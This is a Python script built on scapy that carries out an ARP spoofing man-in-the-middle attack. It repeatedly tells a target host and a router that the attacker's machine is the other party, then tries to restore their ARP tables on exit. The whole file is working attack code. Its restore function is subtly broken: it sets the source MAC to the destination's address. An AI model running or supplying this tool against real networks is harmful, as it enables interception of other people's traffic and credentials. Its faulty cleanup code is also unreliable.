#!/usr/bin/env python3


import scapy.all as scapy
import time


# Gloabal Variables
##############################################################################
TARGET_IP = "10.0.2.15"                           # Target Ip Address
TARGET_MAC_ADDR = "aa:bb:cc:dd:ee:ff"             # Target MAC Address
ROUTER_IP = "10.0.2.1"                            # Router Ip Address
ROUTER_MAC_ADDR = "11:22:33:44:55:66"             # Router MAC Address
OPERATION = 2                                     # Arp Response Package
SLEEP_TIME = 2                                    # Sleep Time
RESTORE_PKG_COUNT = 3                             # Restore Package Count
##############################################################################


def spoof_arp(target_ip, target_mac, spoofed_ip):
    package = scapy.ARP()                         # ARP Package Generated
    package.op = OPERATION                        # Set Operation to Response
    package.pdst = target_ip                      # Set Target Ip Address
    package.hwdst = target_mac                    # Set Target MAC Address
    package.psrc = spoofed_ip                     # Set Router Ip Address 
    scapy.send(package,verbose=False)             # Send the Package


def restore_arp(dest_ip,dest_mac,source_ip,source_mac):
    package = scapy.ARP()                         # ARP Package Generated
    package.op = OPERATION                        # Set Operation to Response
    package.pdst = dest_ip                        # Set Dest Ip Address
    package.hwdst = dest_mac                      # Set Dest MAC Address
    package.psrc = source_ip                      # Set Source Ip Address 
    package.hwsrc = dest_mac                      # Set Source MAC Address
    scapy.send(package,verbose=False)             # Send the Package


def main():
    # Send Packet to the Victim to Say I am the Router
    spoof_arp(TARGET_IP,TARGET_MAC_ADDR,ROUTER_IP)

    # Send Packet to the Router to Say I am the Victim
    spoof_arp(ROUTER_IP,ROUTER_MAC_ADDR,TARGET_IP)

    print("\r" + TARGET_IP + " <---> " + "[YOU]" + " <---> " + ROUTER_IP, end="")


if __name__ == '__main__':
    try:
        while True:
            main()
            time.sleep(SLEEP_TIME)
    except KeyboardInterrupt:
        print("\n[-] Arp Tables Restoring...")
        restore_arp(TARGET_IP,TARGET_MAC_ADDR,ROUTER_IP,ROUTER_MAC_ADDR)
        restore_arp(ROUTER_IP,ROUTER_MAC_ADDR,TARGET_IP,TARGET_MAC_ADDR)
        print("[+] Done!")
        print("[-] Quiting...")